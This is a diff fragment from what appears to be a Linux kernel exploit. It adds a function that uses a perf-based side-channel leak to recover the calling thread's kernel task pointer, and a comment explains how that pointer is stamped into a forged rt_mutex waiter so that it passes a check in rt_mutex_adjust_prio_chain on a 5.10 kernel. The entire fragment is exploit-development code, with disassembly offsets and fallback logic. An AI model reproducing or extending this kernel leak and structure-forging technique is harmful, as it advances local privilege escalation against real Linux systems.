@@ -1751,6 +1751,33 @@ static uintptr_t leak_unique(const struct perf_leak *from,
   return best;
 }
 
+/*
+ * JC2 waiter self-task leak (roll 11, disasm-driven): our 5.10
+ * rt_mutex_adjust_prio_chain checks waiter->task == task at 0x1ed9e0
+ * ([waiter+0x38] cmp) and EXITS on mismatch — the stamped ghost.task
+ * must be the WAITER THREAD's own task. The JC2 stamp runs on the
+ * waiter thread, so a pid=0 (calling-context) perf leak here returns
+ * exactly that task. Cached; first call must come from the waiter.
+ */
+uintptr_t jc2_self_task_leak(void) {
+  static uintptr_t cached;
+  static int tried;
+  if (tried)
+    return cached;
+  tried = 1;
+  struct perf_leak l;
+  if (perf_collect(0, &l) > 0 && l.x28_cnt >= 16 && task_ptr_ok(l.x28)) {
+    cached = l.x28;
+    pr_info("JC2 waiter self-task leak: %016zx (%d votes)\n",
+            cached, l.x28_cnt);
+  } else {
+    pr_warning("JC2 self-task leak failed (cnt=%d) — stamp falls back "
+               "to init_task (walk will exit at task check)\n",
+               l.x28_cnt);
+  }
+  return cached;
+}
+
 static uintptr_t perf_find_task_pid(int pid) {
   struct perf_leak l;
   if (perf_collect(pid, &l) <= 0)
